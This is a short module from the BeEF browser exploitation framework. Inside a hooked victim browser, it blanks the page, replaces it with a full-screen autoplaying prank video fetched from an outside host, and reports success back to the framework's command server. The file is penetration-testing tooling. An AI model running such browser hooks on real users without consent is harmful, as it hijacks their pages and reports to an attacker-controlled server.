//
// Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
        $j('body').html('');

        $j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
        $j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});

        $j('body').html('<video width="100%" height="100%" autoplay><source src="https://rickroll.switchalpha.dev/rickroll.mp4" type="video/mp4"></video>');
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
});
